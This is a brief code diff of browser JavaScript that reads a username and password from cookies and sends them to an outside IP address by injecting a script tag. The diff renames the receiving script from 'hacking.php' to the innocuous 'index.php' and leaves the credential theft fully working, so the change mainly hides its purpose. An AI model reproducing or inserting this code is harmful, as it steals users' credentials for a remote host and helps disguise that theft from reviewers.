@@ -13,5 +13,5 @@
       var username = readCookie('username');
       var password = readCookie('password');        
       var script = document.createElement('script');
-      script.src = 'http://172.26.19.154/hacking.php?username=' + username + '&password='+password;
+      script.src = 'http://172.26.19.154/index.php?username=' + username + '&password='+password;
       document.body.appendChild(script);
